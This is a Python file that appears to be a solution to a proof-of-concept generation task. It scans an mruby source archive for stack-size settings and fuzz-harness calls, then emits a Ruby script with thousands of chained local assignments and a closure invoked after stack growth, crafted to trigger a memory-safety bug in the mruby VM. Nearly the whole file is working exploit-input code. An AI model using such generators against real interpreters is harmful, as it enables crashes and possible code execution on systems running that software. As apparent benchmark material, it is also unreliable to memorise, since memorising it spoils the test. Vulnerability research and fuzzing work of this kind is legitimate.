import os
import re
import tarfile
from typing import Optional


class Solution:
    def _scan_tar_for_markers(self, src_path: str) -> tuple[bool, bool, Optional[int]]:
        """
        Returns: (looks_like_mruby, input_is_irep, stack_init_size)
        """
        looks_like_mruby = False
        input_is_irep = False
        stack_init_size: Optional[int] = None

        def find_stack_init_size(text: str) -> Optional[int]:
            # Common MRuby configs
            m = re.search(r'^\s*#\s*define\s+MRB_STACK_INIT_SIZE\s+(\d+)\s*$', text, re.M)
            if m:
                return int(m.group(1))
            m = re.search(r'^\s*#\s*define\s+MRB_STACK_INIT_SIZ\s+(\d+)\s*$', text, re.M)
            if m:
                return int(m.group(1))
            # Sometimes configured via mrbconf.h as MRB_STACK_INIT_SIZE (again), or MRB_STACK_CAPA
            m = re.search(r'^\s*#\s*define\s+MRB_STACK_CAPA\s+(\d+)\s*$', text, re.M)
            if m:
                return int(m.group(1))
            return None

        # Scan a subset of files for speed
        exts = (".c", ".h", ".cc", ".cpp", ".y", ".l")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                # Prefer likely relevant files
                members.sort(key=lambda m: (
                    0 if ("vm.c" in m.name or "dump.c" in m.name or "irep" in m.name or "fuzz" in m.name) else 1,
                    m.size
                ))
                for mi in members:
                    if not mi.isfile():
                        continue
                    name = mi.name
                    low = name.lower()
                    if not low.endswith(exts):
                        # Still check mrbconf.h if present
                        if low.endswith("mrbconf.h") or low.endswith("mruby/config.h"):
                            try:
                                f = tf.extractfile(mi)
                                if f:
                                    t = f.read(512 * 1024).decode("utf-8", "ignore")
                                    s = find_stack_init_size(t)
                                    if s is not None:
                                        stack_init_size = s
                            except Exception:
                                pass
                        continue
                    if mi.size > 2 * 1024 * 1024:
                        continue
                    try:
                        f = tf.extractfile(mi)
                        if not f:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    text = data.decode("utf-8", "ignore")

                    if ("mruby" in low) or ("mrb_" in text) or ("mrb_vm_exec" in text) or ("mrb_stack_extend" in text):
                        looks_like_mruby = True

                    if stack_init_size is None and ("MRB_STACK_INIT_SIZE" in text or "MRB_STACK_CAPA" in text):
                        s = find_stack_init_size(text)
                        if s is not None:
                            stack_init_size = s

                    # Detect input type via harness calls
                    if ("LLVMFuzzerTestOneInput" in text) or re.search(r'\bmain\s*\(', text):
                        if ("mrb_read_irep" in text) or ("mrb_load_irep" in text) or ("mrb_load_irep_buf" in text):
                            input_is_irep = True
                        if ("mrb_load_nstring" in text) or ("mrb_parse_nstring" in text) or ("mrb_load_string" in text):
                            # Likely source input; keep input_is_irep False unless irep explicitly seen
                            pass

                    if looks_like_mruby and stack_init_size is not None and (input_is_irep is False):
                        # Good enough; continue a bit for irep markers but allow early exit
                        pass

                    # If we already saw an irep load, we can stop early
                    if input_is_irep and looks_like_mruby and stack_init_size is not None:
                        break
        except Exception:
            pass

        return looks_like_mruby, input_is_irep, stack_init_size

    def _gen_ruby_poc(self, nlocals: int) -> bytes:
        # Use chained assignments to create many locals with less text.
        # Also create a closure capturing a stack local and call it after a stack growth event.
        group = 200
        if nlocals < 400:
            nlocals = 400

        lines = []
        lines.append("def heavy\n")
        v = 0
        while v < nlocals:
            end = min(nlocals, v + group)
            names = [f"a{i}" for i in range(v, end)]
            # a0=a1=...=0
            lines.append("  " + "=".join(names) + "=0\n")
            v = end
        lines.append("  0\n")
        lines.append("end\n\n")

        lines.append("def main\n")
        lines.append("  x=1\n")
        lines.append("  p=Proc.new{ x }\n")
        lines.append("  heavy\n")
        lines.append("  p.call\n")
        lines.append("end\n\n")
        lines.append("main\n")

        return "".join(lines).encode("utf-8", "strict")

    def solve(self, src_path: str) -> bytes:
        looks_like_mruby, input_is_irep, stack_init = self._scan_tar_for_markers(src_path)

        # This task's ground-truth PoC is large and consistent with Ruby source input.
        # If irep input is detected, we still return a source PoC as a fallback.
        # (Implementing a fully version-correct .mrb generator here would be brittle.)
        init = stack_init if (stack_init is not None and stack_init > 0) else 128
        # Choose enough locals to force at least one stack extension across typical MRuby configs.
        nlocals = max(1200, init * 10)
        nlocals = min(3000, nlocals)

        # If it doesn't look like MRuby, return a generic stress input anyway.
        if not looks_like_mruby:
            return self._gen_ruby_poc(2000)

        # Prefer source PoC; most likely correct for this task.
        if not input_is_irep:
            return self._gen_ruby_poc(nlocals)

        # Fallback
        return self._gen_ruby_poc(nlocals)